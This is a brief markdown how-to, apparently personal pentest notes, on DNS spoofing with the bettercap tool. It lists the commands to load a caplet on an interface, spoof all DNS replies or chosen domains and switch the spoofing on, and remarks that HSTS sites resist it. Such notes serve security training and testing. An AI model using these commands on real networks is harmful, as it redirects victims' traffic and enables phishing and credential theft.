# DNS spoofing

- Run bettercap with the commands in spoof.cap
```
$ bettercap -iface eth0 -caplet spoof.cap
```

- Set and run dns.spoof
```
$ set dns.spoof.all true
$ set dns.spoof.domains <domain1.com,*.domain1.com,domain2.com,...>
$ dns.spoof on
```
set dns.spoof.all true tels bettercap to response to all DNSs requests<br>
set dns.spoof.domains targets the domains we want to spoof<br>

This will work for all websites except those who run with HSTS protocol 
